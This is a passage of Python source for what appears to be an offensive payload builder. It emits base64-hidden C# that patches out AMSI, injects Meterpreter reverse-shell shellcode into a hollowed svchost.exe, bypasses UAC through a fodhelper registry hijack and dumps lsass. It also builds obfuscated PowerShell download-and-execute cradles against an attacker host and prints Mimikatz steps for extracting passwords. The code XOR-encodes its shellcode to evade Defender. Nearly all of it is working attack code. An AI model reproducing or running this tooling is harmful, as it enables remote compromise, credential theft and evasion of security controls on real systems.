                target = cradle % target
                binargs = " -Win hidden -nonI -noP -Exe ByPass -ENC %s" % powershell_b64encode(target)
                binname = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"
                paydata = "string payload = \"%s%s\";" % (binname,binargs)
                '''
            else:
                pscmd = pscmd.replace('\\','\\\\') #prep for csharp
                paydata = "string payload = \"%s\";" % (pscmd)

            with open(compilefilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                tmid = base64.b64decode(tmid).decode() 
                smid = base64.b64decode(smid).decode()        
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("            " + targetdata + "\n")
                f.write(tmid + "\n")
                f.write("            " + servicedata + "\n")
                f.write(smid + "\n")
                f.write("            " + paydata + "\n")
                f.write(lower)
            f.close()
        if binary == "Hollow":
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIGNsYXNzIFJ1biA6IEFjdGl2aXR5ewoKICAgIHB1YmxpYyBjb25zdCB1aW50IENSRUFURV9TVVNQRU5ERUQgPSAweDQ7CiAgICBwdWJsaWMgY29uc3QgaW50IFBST0NFU1NCQVNJQ0lORk9STUFUSU9OID0gMDsKCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwdWJsaWMgc3RydWN0IFByb2Nlc3NJbmZvCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIEludDMyIFByb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgSW50MzIgVGhyZWFkSWQ7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8pXQogICAgcHVibGljIHN0cnVjdCBTdGFydHVwSW5mbwogICAgewogICAgICAgIHB1YmxpYyB1aW50IGNiOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBSZXNlcnZlZDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwVGl0bGU7CiAgICAgICAgcHVibGljIHVpbnQgZHdYOwogICAgICAgIHB1YmxpYyB1aW50IGR3WTsKICAgICAgICBwdWJsaWMgdWludCBkd1hTaXplOwogICAgICAgIHB1YmxpYyB1aW50IGR3WVNpemU7CiAgICAgICAgcHVibGljIHVpbnQgZHdYQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgdWludCBkd1lDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyB1aW50IGR3RmlsbEF0dHJpYnV0ZTsKICAgICAgICBwdWJsaWMgdWludCBkd0ZsYWdzOwogICAgICAgIHB1YmxpYyBzaG9ydCB3U2hvd1dpbmRvdzsKICAgICAgICBwdWJsaWMgc2hvcnQgY2JSZXNlcnZlZDI7CiAgICAgICAgcHVibGljIEludFB0ciBscFJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRJbnB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRPdXRwdXQ7CiAgICAgICAgcHVibGljIEludFB0ciBoU3RkRXJyb3I7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgaW50ZXJuYWwgc3RydWN0IFByb2Nlc3NCYXNpY0luZm8KICAgIHsKICAgICAgICBwdWJsaWMgSW50UHRyIFJlc2VydmVkMTsKICAgICAgICBwdWJsaWMgSW50UHRyIFBlYkFkZHJlc3M7CiAgICAgICAgcHVibGljIEludFB0ciBSZXNlcnZlZDI7CiAgICAgICAgcHVibGljIEludFB0ciBSZXNlcnZlZDM7CiAgICAgICAgcHVibGljIEludFB0ciBVbmlxdWVQaWQ7CiAgICAgICAgcHVibGljIEludFB0ciBNb3JlUmVzZXJ2ZWQ7CiAgICB9CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBzdGF0aWMgZXh0ZXJuIHZvaWQgU2xlZXAodWludCBkd01pbGxpc2Vjb25kcyk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuQW5zaSldCiAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2VzcyhzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywKICAgICAgICBJbnRQdHIgbHBUaHJlYWRBdHRyaWJ1dGVzLCBib29sIGJJbmhlcml0SGFuZGxlcywgdWludCBkd0NyZWF0aW9uRmxhZ3MsIEludFB0ciBscEVudmlyb25tZW50LCBzdHJpbmcgbHBDdXJyZW50RGlyZWN0b3J5LAogICAgICAgIFtJbl0gcmVmIFN0YXJ0dXBJbmZvIGxwU3RhcnR1cEluZm8sIG91dCBQcm9jZXNzSW5mbyBscFByb2Nlc3NJbmZvcm1hdGlvbik7CgogICAgW0RsbEltcG9ydCgibnRkbGwuZGxsIiwgQ2FsbGluZ0NvbnZlbnRpb24gPSBDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgWndRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhJbnRQdHIgaFByb2Nlc3MsIGludCBwcm9jSW5mb3JtYXRpb25DbGFzcywKICAgICAgICByZWYgUHJvY2Vzc0Jhc2ljSW5mbyBwcm9jSW5mb3JtYXRpb24sIHVpbnQgUHJvY0luZm9MZW4sIHJlZiB1aW50IHJldGxlbik7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgUmVhZFByb2Nlc3NNZW1vcnkoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBCYXNlQWRkcmVzcywgW091dF0gYnl0ZVtdIGxwQnVmZmVyLAogICAgICAgIGludCBkd1NpemUsIG91dCBJbnRQdHIgbHBOdW1iZXJPZmJ5dGVzUlcpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZVByb2Nlc3NNZW1vcnkoSW50UHRyIGhQcm9jZXNzLCBJbnRQdHIgbHBCYXNlQWRkcmVzcywgYnl0ZVtdIGxwQnVmZmVyLCBJbnQzMiBuU2l6ZSwgb3V0IEludFB0ciBscE51bWJlck9mQnl0ZXNXcml0dGVuKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHN0YXRpYyBleHRlcm4gdWludCBSZXN1bWVUaHJlYWQoSW50UHRyIGhUaHJlYWQpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnQzMiBkd1NpemUsIFVJbnQzMiBmbE5ld1Byb3RlY3QsIG91dCBVSW50MzIgbHBmbE9sZFByb3RlY3QpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFZpcnR1YWxBbGxvY0V4TnVtYShJbnRQdHIgaFByb2Nlc3MsIEludFB0ciBscEFkZHJlc3MsIHVpbnQgZHdTaXplLCBVSW50MzIgZmxBbGxvY2F0aW9uVHlwZSwgVUludDMyIGZsUHJvdGVjdCwgVUludDMyIG5uZFByZWZlcnJlZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q3VycmVudFByb2Nlc3MoKTsKCiAgICBwdWJsaWMgUnVuKCkgewogICAgICAgIC8vd3JlY2sgbWltaQogICAgICAgIHN0cmluZyBuYW1lMSA9ICJhIiArICJtc2kiICsgIi5kbGwiOwogICAgICAgIHN0cmluZyBuYW1lMiA9ICJBIiArICJtc2kiICsgIlNjYW5CIiArICJ1ZmZlciI7CiAgICAgICAgSW50UHRyIFRhcmdldERMTCA9IExvYWRMaWJyYXJ5KG5hbWUxKTsKICAgICAgICBJbnRQdHIgTWltaVB0ciA9IEdldFByb2NBZGRyZXNzKFRhcmdldERMTCwgbmFtZTIpOwogICAgICAgIFVJbnQzMiBvbGRQcm90ZWN0ID0gMDsKICAgICAgICBCeXRlW10gYnVmaSA9IHsgMHg0OCwgMHgzMSwgMHhDMCB9OwogICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4NDAsIG91dCBvbGRQcm90ZWN0KTsKICAgICAgICBNYXJzaGFsLkNvcHkoYnVmaSwgMCwgTWltaVB0ciwgYnVmaS5MZW5ndGgpOwogICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4MjAsIG91dCBvbGRQcm90ZWN0KTsKCiAgICAgICAgLy8gbXNmdmVub20gLXAgd2luZG93cy94NjQvbWV0ZXJwcmV0ZXIvcmV2ZXJzZV90Y3AgTEhPU1Q9MTkyLjE2OC4xMzUuNyBMUE9SVD00NDMgRVhJVEZVTkM9dGhyZWFkIC1mIGNzaGFycAogICAgICAgIC8vIFhPUmVkIHdpdGgga2V5IDB4ZmE="
            lower = "ICAgICAgICAvLyBTdGFydCAnc3ZjaG9zdC5leGUnIGluIGEgc3VzcGVuZGVkIHN0YXRlCiAgICAgICAgU3RhcnR1cEluZm8gc0luZm8gPSBuZXcgU3RhcnR1cEluZm8oKTsKICAgICAgICBQcm9jZXNzSW5mbyBwSW5mbyA9IG5ldyBQcm9jZXNzSW5mbygpOwogICAgICAgIGJvb2wgY1Jlc3VsdCA9IENyZWF0ZVByb2Nlc3MobnVsbCwgImM6XFx3aW5kb3dzXFxzeXN0ZW0zMlxcc3ZjaG9zdC5leGUiLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sCiAgICAgICAgICAgIGZhbHNlLCBDUkVBVEVfU1VTUEVOREVELCBJbnRQdHIuWmVybywgbnVsbCwgcmVmIHNJbmZvLCBvdXQgcEluZm8pOwoKICAgICAgICBQcm9jZXNzQmFzaWNJbmZvIHBiSW5mbyA9IG5ldyBQcm9jZXNzQmFzaWNJbmZvKCk7CiAgICAgICAgdWludCByZXRMZW4gPSBuZXcgdWludCgpOwogICAgICAgIGxvbmcgcVJlc3VsdCA9IFp3UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MocEluZm8uaFByb2Nlc3MsIFBST0NFU1NCQVNJQ0lORk9STUFUSU9OLCByZWYgcGJJbmZvLCAodWludCkoSW50UHRyLlNpemUgKiA2KSwgcmVmIHJldExlbik7CiAgICAgICAgSW50UHRyIGJhc2VJbWFnZUFkZHIgPSAoSW50UHRyKSgoSW50NjQpcGJJbmZvLlBlYkFkZHJlc3MgKyAweDEwKTsKCiAgICAgICAgYnl0ZVtdIHByb2NBZGRyID0gbmV3IGJ5dGVbMHg4XTsKICAgICAgICBieXRlW10gZGF0YUJ1ZiA9IG5ldyBieXRlWzB4MjAwXTsKICAgICAgICBJbnRQdHIgYnl0ZXNSVyA9IG5ldyBJbnRQdHIoKTsKICAgICAgICBib29sIHJlc3VsdCA9IFJlYWRQcm9jZXNzTWVtb3J5KHBJbmZvLmhQcm9jZXNzLCBiYXNlSW1hZ2VBZGRyLCBwcm9jQWRkciwgcHJvY0FkZHIuTGVuZ3RoLCBvdXQgYnl0ZXNSVyk7CiAgICAgICAgSW50UHRyIGV4ZWN1dGFibGVBZGRyZXNzID0gKEludFB0cilCaXRDb252ZXJ0ZXIuVG9JbnQ2NChwcm9jQWRkciwgMCk7CiAgICAgICAgcmVzdWx0ID0gUmVhZFByb2Nlc3NNZW1vcnkocEluZm8uaFByb2Nlc3MsIGV4ZWN1dGFibGVBZGRyZXNzLCBkYXRhQnVmLCBkYXRhQnVmLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwoKICAgICAgICB1aW50IGVfbGZhbmV3ID0gQml0Q29udmVydGVyLlRvVUludDMyKGRhdGFCdWYsIDB4M2MpOwogICAgICAgIHVpbnQgcnZhT2Zmc2V0ID0gZV9sZmFuZXcgKyAweDI4OwogICAgICAgIHVpbnQgcnZhID0gQml0Q29udmVydGVyLlRvVUludDMyKGRhdGFCdWYsIChpbnQpcnZhT2Zmc2V0KTsKICAgICAgICBJbnRQdHIgZW50cnlwb2ludEFkZHIgPSAoSW50UHRyKSgoSW50NjQpZXhlY3V0YWJsZUFkZHJlc3MgKyBydmEpOwoKICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IGJ1Zi5MZW5ndGg7IGkrKykKICAgICAgICB7CiAgICAgICAgICAgIGJ1ZltpXSA9IChieXRlKSgodWludClidWZbaV0gXiAweGZhKTsKICAgICAgICB9CgogICAgICAgIHJlc3VsdCA9IFdyaXRlUHJvY2Vzc01lbW9yeShwSW5mby5oUHJvY2VzcywgZW50cnlwb2ludEFkZHIsIGJ1ZiwgYnVmLkxlbmd0aCwgb3V0IGJ5dGVzUlcpOwogICAgICAgIHVpbnQgclJlc3VsdCA9IFJlc3VtZVRocmVhZChwSW5mby5oVGhyZWFkKTsKCiAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIkkgZXhlY3V0ZWQhIik7CiAgICB9Cn0="

            msffilename = "met%s.csharp" % (bitness)
            m = open(msffilename,'r')
            msf = m.read()
            m.close()
            msf = xor_buffer_csharp(msf) # 5/26 -defender

            with open(compilefilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("        " + msf + "\n")
                f.write(lower)
            f.close()
            pass
        if binary == "UACHelper":
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLlRocmVhZGluZzsKdXNpbmcgU3lzdGVtLkRpYWdub3N0aWNzOwp1c2luZyBTeXN0ZW0uTmV0Owp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgTWljcm9zb2Z0LldpbjMyOwpwdWJsaWMgY2xhc3MgUnVuIDogQWN0aXZpdHl7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludDMyIGR3U2l6ZSwgVUludDMyIGZsTmV3UHJvdGVjdCwgb3V0IFVJbnQzMiBscGZsT2xkUHJvdGVjdCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBMb2FkTGlicmFyeShzdHJpbmcgbmFtZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKCiAgICBwdWJsaWMgUnVuKCkgewogICAgICAgIC8vd3JlY2sgbWltaQogICAgICAgIHN0cmluZyBuYW1lMSA9ICJhIiArICJtc2kiICsgIi5kbGwiOwogICAgICAgIHN0cmluZyBuYW1lMiA9ICJBIiArICJtc2kiICsgIlNjYW5CIiArICJ1ZmZlciI7CiAgICAgICAgSW50UHRyIFRhcmdldERMTCA9IExvYWRMaWJyYXJ5KG5hbWUxKTsKICAgICAgICBJbnRQdHIgTWltaVB0ciA9IEdldFByb2NBZGRyZXNzKFRhcmdldERMTCwgbmFtZTIpOwogICAgICAgIFVJbnQzMiBvbGRQcm90ZWN0ID0gMDsKICAgICAgICBCeXRlW10gYnVmaSA9IHsgMHg0OCwgMHgzMSwgMHhDMCB9OwogICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4NDAsIG91dCBvbGRQcm90ZWN0KTsKICAgICAgICBNYXJzaGFsLkNvcHkoYnVmaSwgMCwgTWltaVB0ciwgYnVmaS5MZW5ndGgpOwogICAgICAgIFZpcnR1YWxQcm90ZWN0KE1pbWlQdHIsIDMsIDB4MjAsIG91dCBvbGRQcm90ZWN0KTs="
            lower = "ICAgICAgICBzdHJpbmcgY29tbWFuZCA9IEVuY29kaW5nLlVURjguR2V0U3RyaW5nKGRhdGEpOwoKICAgICAgICBSZWdpc3RyeUtleSBuZXdrZXkgPSBSZWdpc3RyeS5DdXJyZW50VXNlci5PcGVuU3ViS2V5KEAiU29mdHdhcmVcQ2xhc3Nlc1wiLCB0cnVlKTsKICAgICAgICBuZXdrZXkuQ3JlYXRlU3ViS2V5KEAibXMtc2V0dGluZ3NcU2hlbGxcT3Blblxjb21tYW5kIik7CgogICAgICAgIFJlZ2lzdHJ5S2V5IGZvZCA9IFJlZ2lzdHJ5LkN1cnJlbnRVc2VyLk9wZW5TdWJLZXkoQCJTb2Z0d2FyZVxDbGFzc2VzXG1zLXNldHRpbmdzXFNoZWxsXE9wZW5cY29tbWFuZCIsIHRydWUpOwogICAgICAgIGZvZC5TZXRWYWx1ZSgiRGVsZWdhdGVFeGVjdXRlIiwgIiIpOwogICAgICAgIGZvZC5TZXRWYWx1ZSgiIiwgQGNvbW1hbmQpOwogICAgICAgIGZvZC5DbG9zZSgpOwoKICAgICAgICBQcm9jZXNzIHAgPSBuZXcgUHJvY2VzcygpOwogICAgICAgIHAuU3RhcnRJbmZvLldpbmRvd1N0eWxlID0gUHJvY2Vzc1dpbmRvd1N0eWxlLkhpZGRlbjsKICAgICAgICBwLlN0YXJ0SW5mby5GaWxlTmFtZSA9ICJDOlxcd2luZG93c1xcc3lzdGVtMzJcXGZvZGhlbHBlci5leGUiOwogICAgICAgIHAuU3RhcnQoKTsKCiAgICAgICAgVGhyZWFkLlNsZWVwKDEwMDAwKTsKCiAgICAgICAgbmV3a2V5LkRlbGV0ZVN1YktleVRyZWUoIm1zLXNldHRpbmdzIik7CiAgICAgICAgcmV0dXJuOwoKICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiSSBleGVjdXRlZCEiKTsKICAgIH0KfQ=="

            runnerfilename = "run.txt"

            cradle = "$wc = (new-object system.net.webclient);"
            if proxy_kill == "1":
                cradle += "$wc.proxy = $null;"
            if custom_agent == "1":
                cradle += "$wc.headers.add('User-Agent','%s');" % agent_string
            if proxy_steal == "1":
                cradle += "New-PSDrive -NAME HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$keys = gci \'HKU:\\\';ForEach ($key in $keys) {if ($key.Name -like \"*S-1-5-21-*\") {$start = $key.Name.substring(10);break}};$proxyAddr = (Get-ItemProperty -Path \"HKU:$start\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\\").ProxyServer;"
                cradle += "[system.net.webrequest]::DefaultWebProxy = new-object system.net.webproxy(\"http://$proxyAddr\");" #note: assuming proxy over http, not https
            cradle += "iex($wc.downloadstring('%s'))"
            #print('[DEBUG] cradle:\n%s' % cradle)

            #//rundll32 SHELL32.DLL,ShellExec_RunDLL "cmd" "/c p^o^w^e^rs^h^e^ll.exe iex((new-object net.webclient).downloadstring([System.Text.Encoding]::ASCII.GetString([char[]]@(104 , 116 ,116 ,112 ,58,47 , 47, 49 ,57, 50, 46,49, 54 , 56,46 ,49 ,51,53 ,46, 55 ,47,114,117, 110, 46, 116 , 120 ,116))))"
            target = "http://%s/%s" % (lhost,runnerfilename)
            target = cradle % target
            #print ('[DEBUG] target:\n%s' % target)
            chars = chararray(target)
            chars = ", ".join(chars)

            base = "rundll32 SHELL32.DLL,ShellExec_RunDLL \"cmd\" \"/c p^o^w^e^rs^h^e^ll.exe iex([System.Text.Encoding]::ASCII.GetString([char[]]@(%s)))\""
            base = base % chars
            base_b64 = base64.b64encode(base.encode()).decode()
            #print (base)

            data = "byte[] data = Convert.FromBase64String(\"%s\");" % base_b64

            with open(compilefilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("        " + data + "\n")
                f.write(lower)
            f.close()
            pass
        if binary == "MiniDump":
            upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWw7CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5UZXh0OwoKcHVibGljIGNsYXNzIFJ1biA6IEFjdGl2aXR5ewoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnQzMiBkd1NpemUsIFVJbnQzMiBmbE5ld1Byb3RlY3QsIG91dCBVSW50MzIgbHBmbE9sZFByb3RlY3QpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgiRGJnaGVscC5kbGwiKV0KICAgIHN0YXRpYyBleHRlcm4gYm9vbCBNaW5pRHVtcFdyaXRlRHVtcChJbnRQdHIgaFByb2Nlc3MsIGludCBQcm9jZXNzSWQsIEludFB0ciBoRmlsZSwgaW50IER1bXBUeXBlLCBJbnRQdHIgRXhjZXB0aW9uUGFyYW0sIEludFB0ciBVc2VyU3RyZWFtUGFyYW0sIEludFB0ciBDYWxsYmFja1BhcmFtKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBFeGFjdFNwZWxsaW5nID0gdHJ1ZSldCiAgICBzdGF0aWMgZXh0ZXJuIEludFB0ciBPcGVuUHJvY2Vzcyh1aW50IHByb2Nlc3NBY2Nlc3MsIGJvb2wgYkluaGVyaXRIYW5kbGUsIGludCBwcm9jZXNzSWQpOwoKICAgIHB1YmxpYyBSdW4oKSB7CiAgICAgICAgLy93cmVjayBtaW1pCiAgICAgICAgc3RyaW5nIG5hbWUxID0gImEiICsgIm1zaSIgKyAiLmRsbCI7CiAgICAgICAgc3RyaW5nIG5hbWUyID0gIkEiICsgIm1zaSIgKyAiU2NhbkIiICsgInVmZmVyIjsKICAgICAgICBJbnRQdHIgVGFyZ2V0RExMID0gTG9hZExpYnJhcnkobmFtZTEpOwogICAgICAgIEludFB0ciBNaW1pUHRyID0gR2V0UHJvY0FkZHJlc3MoVGFyZ2V0RExMLCBuYW1lMik7CiAgICAgICAgVUludDMyIG9sZFByb3RlY3QgPSAwOwogICAgICAgIEJ5dGVbXSBidWZpID0geyAweDQ4LCAweDMxLCAweEMwIH07CiAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHg0MCwgb3V0IG9sZFByb3RlY3QpOwogICAgICAgIE1hcnNoYWwuQ29weShidWZpLCAwLCBNaW1pUHRyLCBidWZpLkxlbmd0aCk7CiAgICAgICAgVmlydHVhbFByb3RlY3QoTWltaVB0ciwgMywgMHgyMCwgb3V0IG9sZFByb3RlY3QpOw=="
            lower = "ICAgICAgICBQcm9jZXNzW10gbHNhc3MgPSBQcm9jZXNzLkdldFByb2Nlc3Nlc0J5TmFtZSgibHNhc3MiKTsKICAgICAgICBpbnQgbHNhc3NfcGlkID0gbHNhc3NbMF0uSWQ7CgogICAgICAgIEludFB0ciBoUHJvY2VzcyA9IE9wZW5Qcm9jZXNzKDB4MDAxRjBGRkYsIGZhbHNlLCBsc2Fzc19waWQpOwogICAgICAgIGJvb2wgZHVtcGVkID0gTWluaUR1bXBXcml0ZUR1bXAoaFByb2Nlc3MsIGxzYXNzX3BpZCwgZHVtcEZpbGUuU2FmZUZpbGVIYW5kbGUuRGFuZ2Vyb3VzR2V0SGFuZGxlKCksIDIsIEludFB0ci5aZXJvLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOwogICAgCgogICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJJIGV4ZWN1dGVkISIpOwogICAgfQp9"

            dumppath = "c:\\windows\\tasks\\"
            dumpfile = "lsass.dmp"
            dumpfilepath = dumppath + dumpfile
            dumpfilepath = dumpfilepath.replace('\\','\\\\') #prep for conversion to csharp

            data = "FileStream dumpFile = new FileStream(\"%s\", FileMode.Create);" % (dumpfilepath)

            with open(compilefilename,'w') as f:
                upper = base64.b64decode(upper).decode()
                lower = base64.b64decode(lower).decode()
                f.write(upper + "\n")
                f.write("        " + data + "\n")
                f.write(lower)
            f.close()

            print('[!] MiniDump chosen! post-usage instructions:')
            print('[*] check dump:\ndir %s\ndir %s' % (dumpfilepath,dumpfilepath.replace('\\\\','\\')))
            print('[*] dump lsass (on windows!):\ndownload %s\ndownload %s\ncp lsass.dmp /var/www/html/\nwget -uri http://%s/lsass.dmp -OutFile C:\\tools\\lsass.dmp\niex(new-object net.webclient).downloadstring(\'http://%s/kiwi.txt\')\nInvoke-Mimikatz -Command "`"sekurlsa::minidump c:\\tools\\lsass.dmp`" sekurlsa::logonpasswords" > c:\\tools\\dump.txt\ntype c:\\tools\\dump.txt' % (dumpfilepath,dumpfilepath.replace('\\\\','\\'),devhost,devhost))
            pass
        # Runspace in makecompile failed - cannot compile with "using System.Management.Automation;" and "using System.Management.Automation.Runspaces;"
        '''
        if binary == "Runspace":
            #upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uV29ya2Zsb3cuQ29tcG9uZW50TW9kZWw7CnVzaW5nIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb247CnVzaW5nIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKcHVibGljIGNsYXNzIFJ1biA6IEFjdGl2aXR5ewoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFZpcnR1YWxQcm90ZWN0KEludFB0ciBscEFkZHJlc3MsIFVJbnQzMiBkd1NpemUsIFVJbnQzMiBmbE5ld1Byb3RlY3QsIG91dCBVSW50MzIgbHBmbE9sZFByb3RlY3QpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgcHVibGljIFJ1bigpIHsKICAgICAgICAvL3dyZWNrIG1pbWkKICAgICAgICBzdHJpbmcgbmFtZTEgPSAiYSIgKyAibXNpIiArICIuZGxsIjsKICAgICAgICBzdHJpbmcgbmFtZTIgPSAiQSIgKyAibXNpIiArICJTY2FuQiIgKyAidWZmZXIiOwogICAgICAgIEludFB0ciBUYXJnZXRETEwgPSBMb2FkTGlicmFyeShuYW1lMSk7CiAgICAgICAgSW50UHRyIE1pbWlQdHIgPSBHZXRQcm9jQWRkcmVzcyhUYXJnZXRETEwsIG5hbWUyKTsKICAgICAgICBVSW50MzIgb2xkUHJvdGVjdCA9IDA7CiAgICAgICAgQnl0ZVtdIGJ1ZmkgPSB7IDB4NDgsIDB4MzEsIDB4QzAgfTsKICAgICAgICBWaXJ0dWFsUHJvdGVjdChNaW1pUHRyLCAzLCAweDQwLCBvdXQgb2xkUHJvdGVjdCk7CiAgICAgICAgTWFyc2hhbC5Db3B5KGJ1ZmksIDAsIE1pbWlQdHIsIGJ1ZmkuTGVuZ3RoKTsKICAgICAgICBWaXJ0dWFsUH